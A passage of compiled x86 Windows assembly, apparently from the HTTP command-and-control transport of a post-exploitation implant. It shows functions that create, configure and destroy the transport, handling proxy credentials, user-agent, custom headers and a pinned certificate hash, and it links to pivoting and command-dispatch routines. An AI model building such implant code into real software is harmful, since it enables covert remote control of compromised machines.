	movl	28(%eax), %eax
	movl	%eax, (%esp)
	call	_wcslen
	movl	%eax, %ebx
	movl	-44(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, (%esp)
	call	_wcslen
	subl	%eax, %ebx
	movl	%ebx, %eax
	movl	%eax, -48(%ebp)
	cmpl	$0, -48(%ebp)
	jle	L112
	movl	-48(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC84, (%esp)
	call	_real_dprintf
	movl	-40(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, (%esp)
	call	_wcslen
	movl	-48(%ebp), %edx
	addl	%edx, %eax
	addl	$1, %eax
	leal	(%eax,%eax), %edx
	movl	-40(%ebp), %eax
	movl	44(%eax), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_realloc
	movl	-40(%ebp), %edx
	movl	%eax, 44(%edx)
L112:
	movl	-40(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, -28(%ebp)
	movl	$0, -32(%ebp)
	jmp	L113
L119:
	addl	$2, -28(%ebp)
	jmp	L114
L116:
	addl	$2, -28(%ebp)
L114:
	movl	-28(%ebp), %eax
	movzwl	(%eax), %eax
	testw	%ax, %ax
	je	L115
	movl	-28(%ebp), %eax
	movzwl	(%eax), %eax
	cmpw	$47, %ax
	jne	L116
L115:
	movl	-28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC85, (%esp)
	call	_real_dprintf
	movl	-28(%ebp), %eax
	movzwl	(%eax), %eax
	testw	%ax, %ax
	je	L127
	addl	$1, -32(%ebp)
L113:
	cmpl	$2, -32(%ebp)
	jle	L119
	jmp	L118
L127:
	nop
L118:
	movl	-28(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC86, (%esp)
	call	_real_dprintf
	movl	-44(%ebp), %eax
	movl	28(%eax), %ebx
	cmpl	$0, -48(%ebp)
	jle	L120
	movl	-44(%ebp), %eax
	movl	28(%eax), %eax
	jmp	L121
L120:
	movl	-44(%ebp), %eax
	movl	24(%eax), %eax
L121:
	movl	%eax, (%esp)
	call	_wcslen
	addl	$1, %eax
	movl	%ebx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__wcscpy_s, %eax
	call	*%eax
	movl	-40(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC87, (%esp)
	call	_real_dprintf
	movl	-44(%ebp), %eax
	movl	24(%eax), %eax
	testl	%eax, %eax
	je	L122
	movl	-44(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-44(%ebp), %eax
	movl	$0, 24(%eax)
L122:
	movl	-44(%ebp), %eax
	movl	28(%eax), %edx
	movl	-44(%ebp), %eax
	movl	%edx, 24(%eax)
	movl	-44(%ebp), %eax
	movl	$0, 28(%eax)
	jmp	L97
L109:
	movl	$LC88, (%esp)
	call	_real_dprintf
L97:
	cmpl	$0, -12(%ebp)
	jne	L123
	jmp	L99
L125:
	nop
	jmp	L99
L126:
	nop
L99:
	movl	-16(%ebp), %eax
	movl	-4(%ebp), %ebx
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC89:
	.ascii "[TRANS HTTP] Destroying http transport for url %S\0"
	.text
	.def	_transport_destroy_http;	.scl	3;	.type	32;	.endef
_transport_destroy_http:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	cmpl	$0, 8(%ebp)
	je	L142
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	andl	$2, %eax
	testl	%eax, %eax
	je	L142
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, -12(%ebp)
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC89, (%esp)
	call	_real_dprintf
	cmpl	$0, -12(%ebp)
	je	L130
	movl	-12(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L131
	movl	-12(%ebp), %eax
	movl	12(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-12(%ebp), %eax
	movl	$0, 12(%eax)
L131:
	movl	-12(%ebp), %eax
	movl	32(%eax), %eax
	testl	%eax, %eax
	je	L132
	movl	-12(%ebp), %eax
	movl	32(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-12(%ebp), %eax
	movl	$0, 32(%eax)
L132:
	movl	-12(%ebp), %eax
	movl	40(%eax), %eax
	testl	%eax, %eax
	je	L133
	movl	-12(%ebp), %eax
	movl	40(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-12(%ebp), %eax
	movl	$0, 40(%eax)
L133:
	movl	-12(%ebp), %eax
	movl	36(%eax), %eax
	testl	%eax, %eax
	je	L134
	movl	-12(%ebp), %eax
	movl	36(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-12(%ebp), %eax
	movl	$0, 36(%eax)
L134:
	movl	-12(%ebp), %eax
	movl	20(%eax), %eax
	testl	%eax, %eax
	je	L135
	movl	-12(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-12(%ebp), %eax
	movl	$0, 20(%eax)
L135:
	movl	-12(%ebp), %eax
	movl	24(%eax), %eax
	testl	%eax, %eax
	je	L136
	movl	-12(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-12(%ebp), %eax
	movl	$0, 24(%eax)
L136:
	movl	-12(%ebp), %eax
	movl	44(%eax), %eax
	testl	%eax, %eax
	je	L137
	movl	-12(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-12(%ebp), %eax
	movl	$0, 44(%eax)
L137:
	movl	-12(%ebp), %eax
	movl	52(%eax), %eax
	testl	%eax, %eax
	je	L138
	movl	-12(%ebp), %eax
	movl	52(%eax), %eax
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	je	L139
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__GlobalFree@4, %eax
	call	*%eax
	subl	$4, %esp
L139:
	movl	-16(%ebp), %eax
	movl	8(%eax), %eax
	testl	%eax, %eax
	je	L138
	movl	-16(%ebp), %eax
	movl	8(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__GlobalFree@4, %eax
	call	*%eax
	subl	$4, %esp
L138:
	movl	-12(%ebp), %eax
	movl	52(%eax), %eax
	testl	%eax, %eax
	je	L130
	movl	-12(%ebp), %eax
	movl	52(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-12(%ebp), %eax
	movl	$0, 52(%eax)
L130:
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	testl	%eax, %eax
	je	L140
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	8(%ebp), %eax
	movl	$0, 44(%eax)
L140:
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	testl	%eax, %eax
	je	L141
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	8(%ebp), %eax
	movl	$0, 48(%eax)
L141:
	cmpl	$0, 8(%ebp)
	je	L142
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, 8(%ebp)
L142:
	nop
	leave
	ret
	.section .rdata,"dr"
LC90:
	.ascii "[HTTP CONF] Writing timeouts\0"
LC91:
	.ascii "[HTTP CONF] Writing UA\0"
LC92:
	.ascii "[HTTP CONF] Writing cert hash\0"
LC93:
	.ascii "[HTTP CONF] Writing proxy\0"
LC94:
	.ascii "[HTTP CONF] Writing user\0"
LC95:
	.ascii "[HTTP CONF] Writing pass\0"
	.align 4
LC96:
	.ascii "[HTTP CONF] Writing custom headers\0"
LC97:
	.ascii "[HTTP CONF] Done.\0"
	.text
	.globl	_transport_write_http_config
	.def	_transport_write_http_config;	.scl	2;	.type	32;	.endef
_transport_write_http_config:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, -12(%ebp)
	movl	$LC90, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	52(%eax), %edx
	movl	12(%ebp), %eax
	movl	%edx, 1024(%eax)
	movl	8(%ebp), %eax
	movl	56(%eax), %eax
	movl	%eax, %edx
	movl	12(%ebp), %eax
	movl	%edx, 1028(%eax)
	movl	8(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	12(%ebp), %eax
	movl	%edx, 1032(%eax)
	movl	8(%ebp), %eax
	movl	44(%eax), %edx
	movl	12(%ebp), %eax
	movl	$512, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_wcsncpy
	movl	-12(%ebp), %eax
	movl	20(%eax), %eax
	testl	%eax, %eax
	je	L144
	movl	$LC91, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	20(%eax), %eax
	movl	12(%ebp), %edx
	addl	$1548, %edx
	movl	$256, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_wcsncpy
L144:
	movl	-12(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L145
	movl	$LC92, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	12(%eax), %eax
	movl	12(%ebp), %edx
	addl	$2060, %edx
	movl	$20, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
L145:
	movl	-12(%ebp), %eax
	movl	32(%eax), %eax
	testl	%eax, %eax
	je	L146
	movl	$LC93, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	32(%eax), %eax
	movl	12(%ebp), %edx
	addl	$1036, %edx
	movl	$128, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_wcsncpy
L146:
	movl	-12(%ebp), %eax
	movl	36(%eax), %eax
	testl	%eax, %eax
	je	L147
	movl	$LC94, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	36(%eax), %eax
	movl	12(%ebp), %edx
	addl	$1292, %edx
	movl	$64, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_wcsncpy
L147:
	movl	-12(%ebp), %eax
	movl	40(%eax), %eax
	testl	%eax, %eax
	je	L148
	movl	$LC95, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	40(%eax), %eax
	movl	12(%ebp), %edx
	addl	$1420, %edx
	movl	$64, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_wcsncpy
L148:
	movl	-12(%ebp), %eax
	movl	44(%eax), %eax
	testl	%eax, %eax
	je	L149
	movl	$LC96, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	44(%eax), %eax
	movl	12(%ebp), %edx
	addl	$2080, %edx
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_wcscpy
L149:
	movl	$LC97, (%esp)
	call	_real_dprintf
	nop
	leave
	ret
	.def	_transport_get_config_size_http;	.scl	3;	.type	32;	.endef
_transport_get_config_size_http:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$2082, -12(%ebp)
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	movl	44(%eax), %eax
	testl	%eax, %eax
	je	L151
	movl	-16(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, (%esp)
	call	_wcslen
	addl	%eax, %eax
	addl	%eax, -12(%ebp)
L151:
	movl	-12(%ebp), %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC98:
	.ascii "[TRANS HTTP] Creating http transport for url %S\0"
LC99:
	.ascii "[TRANS HTTP] Given ua: %S\0"
	.align 4
LC100:
	.ascii "[TRANS HTTP] Given proxy host: %S\0"
	.align 4
LC101:
	.ascii "[TRANS HTTP] Given proxy user: %S\0"
	.align 4
LC102:
	.ascii "[TRANS HTTP] Given proxy pass: %S\0"
	.align 2
LC103:
	.ascii "h\0t\0t\0p\0s\0\0\0"
	.align 4
LC104:
	.ascii "[SERVER] Received HTTPS Hash: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\0"
	.text
	.globl	_transport_create_http
	.def	_transport_create_http;	.scl	2;	.type	32;	.endef
_transport_create_http:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$204, %esp
	movl	$76, (%esp)
	call	_malloc
	movl	%eax, -28(%ebp)
	movl	$84, (%esp)
	call	_malloc
	movl	%eax, -32(%ebp)
	cmpl	$0, 12(%ebp)
	je	L154
	movl	12(%ebp), %eax
	movl	$2082, (%eax)
L154:
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC98, (%esp)
	call	_real_dprintf
	movl	$76, 8(%esp)
	movl	$0, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	$84, 8(%esp)
	movl	$0, 4(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	8(%ebp), %eax
	addl	$1548, %eax
	movl	%eax, 4(%esp)
	movl	$LC99, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movzwl	1548(%eax), %eax
	testw	%ax, %ax
	je	L155
	movl	8(%ebp), %eax
	addl	$1548, %eax
	movl	%eax, (%esp)
	movl	__imp___wcsdup, %eax
	call	*%eax
	movl	-32(%ebp), %edx
	movl	%eax, 20(%edx)
L155:
	movl	8(%ebp), %eax
	addl	$1036, %eax
	movl	%eax, 4(%esp)
	movl	$LC100, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movzwl	1036(%eax), %eax
	testw	%ax, %ax
	je	L156
	movl	8(%ebp), %eax
	addl	$1036, %eax
	movl	%eax, (%esp)
	movl	__imp___wcsdup, %eax
	call	*%eax
	movl	-32(%ebp), %edx
	movl	%eax, 32(%edx)
L156:
	movl	8(%ebp), %eax
	addl	$1292, %eax
	movl	%eax, 4(%esp)
	movl	$LC101, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movzwl	1292(%eax), %eax
	testw	%ax, %ax
	je	L157
	movl	8(%ebp), %eax
	addl	$1292, %eax
	movl	%eax, (%esp)
	movl	__imp___wcsdup, %eax
	call	*%eax
	movl	-32(%ebp), %edx
	movl	%eax, 36(%edx)
L157:
	movl	8(%ebp), %eax
	addl	$1420, %eax
	movl	%eax, 4(%esp)
	movl	$LC102, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movzwl	1420(%eax), %eax
	testw	%ax, %ax
	je	L158
	movl	8(%ebp), %eax
	addl	$1420, %eax
	movl	%eax, (%esp)
	movl	__imp___wcsdup, %eax
	call	*%eax
	movl	-32(%ebp), %edx
	movl	%eax, 40(%edx)
L158:
	movl	8(%ebp), %eax
	movl	$5, 8(%esp)
	movl	$LC103, 4(%esp)
	movl	%eax, (%esp)
	call	_wcsncmp
	testl	%eax, %eax
	sete	%al
	movzbl	%al, %edx
	movl	-32(%ebp), %eax
	movl	%edx, (%eax)
	movl	8(%ebp), %eax
	movzwl	2080(%eax), %eax
	testw	%ax, %ax
	je	L159
	movl	8(%ebp), %eax
	addl	$2080, %eax
	movl	%eax, (%esp)
	movl	__imp___wcsdup, %eax
	call	*%eax
	movl	-32(%ebp), %edx
	movl	%eax, 44(%edx)
	cmpl	$0, 12(%ebp)
	je	L159
	movl	-32(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, (%esp)
	call	_wcslen
	leal	(%eax,%eax), %edx
	movl	12(%ebp), %eax
	movl	(%eax), %eax
	addl	%eax, %edx
	movl	12(%ebp), %eax
	movl	%edx, (%eax)
L159:
	movl	8(%ebp), %eax
	movzbl	2079(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	8(%ebp), %eax
	movzbl	2078(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -60(%ebp)
	movl	8(%ebp), %eax
	movzbl	2077(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -64(%ebp)
	movl	8(%ebp), %eax
	movzbl	2076(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -68(%ebp)
	movl	8(%ebp), %eax
	movzbl	2075(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -72(%ebp)
	movl	8(%ebp), %eax
	movzbl	2074(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -76(%ebp)
	movl	8(%ebp), %eax
	movzbl	2073(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -80(%ebp)
	movl	8(%ebp), %eax
	movzbl	2072(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -84(%ebp)
	movl	8(%ebp), %eax
	movzbl	2071(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -88(%ebp)
	movl	8(%ebp), %eax
	movzbl	2070(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -92(%ebp)
	movl	8(%ebp), %eax
	movzbl	2069(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -96(%ebp)
	movl	8(%ebp), %eax
	movzbl	2068(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -100(%ebp)
	movl	8(%ebp), %eax
	movzbl	2067(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -104(%ebp)
	movl	8(%ebp), %eax
	movzbl	2066(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -108(%ebp)
	movl	8(%ebp), %eax
	movzbl	2065(%eax), %eax
	movzbl	%al, %edi
	movl	8(%ebp), %eax
	movzbl	2064(%eax), %eax
	movzbl	%al, %esi
	movl	8(%ebp), %eax
	movzbl	2063(%eax), %eax
	movzbl	%al, %ebx
	movl	8(%ebp), %eax
	movzbl	2062(%eax), %eax
	movzbl	%al, %ecx
	movl	8(%ebp), %eax
	movzbl	2061(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -112(%ebp)
	movl	8(%ebp), %eax
	movzbl	2060(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 80(%esp)
	movl	-60(%ebp), %edx
	movl	%edx, 76(%esp)
	movl	-64(%ebp), %edx
	movl	%edx, 72(%esp)
	movl	-68(%ebp), %edx
	movl	%edx, 68(%esp)
	movl	-72(%ebp), %edx
	movl	%edx, 64(%esp)
	movl	-76(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-80(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-84(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-88(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-92(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-96(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-100(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-104(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-108(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-112(%ebp), %edi
	movl	%edi, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC104, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L160
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-32(%ebp), %eax
	movl	$0, 12(%eax)
L160:
	movl	$0, -52(%ebp)
	movl	$0, -48(%ebp)
	movl	$0, -44(%ebp)
	movl	$0, -40(%ebp)
	movl	$0, -36(%ebp)
	movl	8(%ebp), %eax
	leal	2060(%eax), %edx
	movl	$20, 8(%esp)
	leal	-52(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcmp
	testl	%eax, %eax
	je	L161
	movl	$20, (%esp)
	call	_malloc
	movl	%eax, %edx
	movl	-32(%ebp), %eax
	movl	%edx, 12(%eax)
	movl	8(%ebp), %eax
	leal	2060(%eax), %edx
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	movl	$20, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_memcpy
L161:
	movl	-32(%ebp), %eax
	movl	$_get_request_winhttp, 60(%eax)
	movl	-32(%ebp), %eax
	movl	$_send_request_winhttp, 64(%eax)
	movl	-32(%ebp), %eax
	movl	$_close_request_winhttp, 68(%eax)
	movl	-32(%ebp), %eax
	movl	$_validate_response_winhttp, 72(%eax)
	movl	-32(%ebp), %eax
	movl	$_receive_response_winhttp, 76(%eax)
	movl	-32(%ebp), %eax
	movl	$_read_response_winhttp, 80(%eax)
	movl	8(%ebp), %eax
	movl	1024(%eax), %edx
	movl	-28(%ebp), %eax
	movl	%edx, 52(%eax)
	movl	8(%ebp), %eax
	movl	1028(%eax), %eax
	movl	%eax, %edx
	movl	-28(%ebp), %eax
	movl	%edx, 56(%eax)
	movl	8(%ebp), %eax
	movl	1032(%eax), %eax
	movl	%eax, %edx
	movl	-28(%ebp), %eax
	movl	%edx, 60(%eax)
	movl	-32(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	je	L162
	movl	$6, %edx
	jmp	L163
L162:
	movl	$2, %edx
L163:
	movl	-28(%ebp), %eax
	movl	%edx, (%eax)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___wcsdup, %eax
	call	*%eax
	movl	-28(%ebp), %edx
	movl	%eax, 44(%edx)
	movl	-28(%ebp), %eax
	movl	44(%eax), %edx
	movl	-32(%ebp), %eax
	movl	%edx, 16(%eax)
	movl	-28(%ebp), %eax
	movl	$_packet_transmit_http, 36(%eax)
	movl	-28(%ebp), %eax
	movl	$_server_dispatch_http, 32(%eax)
	movl	-28(%ebp), %eax
	movl	$_server_init_winhttp, 20(%eax)
	movl	-28(%ebp), %eax
	movl	$_server_deinit_http, 24(%eax)
	movl	-28(%ebp), %eax
	movl	$_transport_destroy_http, 28(%eax)
	movl	-28(%ebp), %eax
	movl	-32(%ebp), %edx
	movl	%edx, 48(%eax)
	call	_current_unix_timestamp
	movl	-28(%ebp), %edx
	movl	%eax, 64(%edx)
	movl	-28(%ebp), %eax
	movl	$_transport_get_config_size_http, 12(%eax)
	movl	-28(%ebp), %eax
	addl	$204, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strlen;	.scl	2;	.type	32;	.endef
	.def	_vsnprintf_s;	.scl	2;	.type	32;	.endef
	.def	_WinHttpOpenRequest@28;	.scl	2;	.type	32;	.endef
	.def	_WinHttpGetIEProxyConfigForCurrentUser@4;	.scl	2;	.type	32;	.endef
	.def	_WinHttpGetProxyForUrl@16;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_calloc;	.scl	2;	.type	32;	.endef
	.def	_WinHttpSetOption@16;	.scl	2;	.type	32;	.endef
	.def	_wcslen;	.scl	2;	.type	32;	.endef
	.def	_WinHttpCloseHandle@4;	.scl	2;	.type	32;	.endef
	.def	_WinHttpReadData@16;	.scl	2;	.type	32;	.endef
	.def	_WinHttpSendRequest@28;	.scl	2;	.type	32;	.endef
	.def	_WinHttpReceiveResponse@8;	.scl	2;	.type	32;	.endef
	.def	_WinHttpQueryHeaders@24;	.scl	2;	.type	32;	.endef
	.def	_WinHttpQueryOption@16;	.scl	2;	.type	32;	.endef
	.def	_memcmp;	.scl	2;	.type	32;	.endef
	.def	_lock_acquire;	.scl	2;	.type	32;	.endef
	.def	_lock_release;	.scl	2;	.type	32;	.endef
	.def	_xor_bytes;	.scl	2;	.type	32;	.endef
	.def	_is_null_guid;	.scl	2;	.type	32;	.endef
	.def	_decrypt_packet;	.scl	2;	.type	32;	.endef
	.def	_pivot_tree_find;	.scl	2;	.type	32;	.endef
	.def	_pivot_packet_dispatch;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_WinHttpOpen@20;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
	.def	_WinHttpCrackUrl@16;	.scl	2;	.type	32;	.endef
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
	.def	_WinHttpConnect@16;	.scl	2;	.type	32;	.endef
	.def	_transport_move_to_wininet;	.scl	2;	.type	32;	.endef
	.def	_event_poll;	.scl	2;	.type	32;	.endef
	.def	_command_handle;	.scl	2;	.type	32;	.endef
	.def	_realloc;	.scl	2;	.type	32;	.endef
	.def	_wcsncpy;	.scl	2;	.type	32;	.endef
	.def	_memcpy;	.scl	2;	.type	32;	.endef
	.def	_wcscpy;	.scl	2;	.type	32;	.endef
	.def	_wcsncmp;	.scl	2;	.type	32;	.endef
